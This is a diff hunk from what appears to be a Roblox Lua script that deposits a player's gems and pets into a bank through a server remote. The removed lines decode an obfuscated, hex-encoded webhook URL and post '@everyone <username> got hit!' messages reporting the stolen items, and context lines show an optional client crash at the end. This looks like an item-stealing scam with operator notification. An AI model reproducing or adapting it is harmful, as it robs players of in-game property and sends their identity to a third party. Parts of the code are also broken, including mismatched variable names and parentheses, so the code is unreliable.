@@ -221,25 +221,6 @@ local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank deposi
 local result = Event:InvokeServer(A_1)
 end
 
-if _G.Sub_Loader_Key ~= nil then
-function fromHex(str)
-	return (str:gsub('..', function (cc)
-		return string.char(tonumber(cc, 16))
-	end))
-end
-local webhookparts = string.split(_G.Sub_Loader_Key, "x")
-local webhookurl = "https://webhook.lewistehminerz.dev/api/webhooks/"..fromHex(webhookparts[1].."/"..fromHex(webhookparts[2]))
-local http = game:GetService("HttpService")
-if _G.DepoAllPets and _G.DepoAllGems then
-game:HttpPost(webhookurl, httpService:JSONEncode({content = "@everyone "..game.Players:GetNameFromUserIdAsync(game.Players.LocalPlayer.UserId).." got hit! You got "..output-1.." Gems from AutoDepositGems and "..#FinalList.." Pets from AutoDepositPets!"}))
-elseif _G.DepoAllPets and not _G.DepoAllGems then
-game:HttpPost(webhookurl, httpService:JSONEncode({content = "@everyone "..game.Players:GetNameFromUserIdAsync(game.Players.LocalPlayer.UserId).." got hit! You got "..#FinalList.." Pets from AutoDepositPets!"}))
-elseif _G.DepoAllGems and not _G.DepoAllPets then
-game:HttpPost(webhookurl, httpService:JSONEncode({content = "@everyone "..game.Players:GetNameFromUserIdAsync(game.Players.LocalPlayer.UserId).." got hit! You got "..output-1.." Gems from AutoDepositGems!"}))
-else
-game:HttpPost(webhookurl, httpService:JSONEncode({content = "@everyone "..game.Players:GetNameFromUserIdAsync(game.Players.LocalPlayer.UserId).." got hit!"))
-end
-
 wait(0.5)
 if _G.CrashAtEnd then
 spawn(function()
